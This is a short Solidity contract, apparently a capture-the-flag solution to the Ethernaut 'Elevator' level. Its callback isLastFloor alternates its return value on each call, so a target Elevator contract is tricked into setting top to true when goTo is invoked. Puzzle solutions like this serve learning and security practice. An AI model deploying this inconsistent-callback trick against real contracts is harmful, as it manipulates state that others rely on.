pragma solidity ^0.8;

interface Elevator {
    function top() external returns (bool);

    function floor() external returns (uint256);

    function goTo(uint256 _floor) external;
}

contract HackedBuilding {
    bool hehe = true;

    // do the attack.
    function attack(address target) public {
        Elevator e = Elevator(target);
        e.goTo(1);
    }

    function isLastFloor(uint256) public returns (bool) {
        return hehe = !hehe;
    }
}
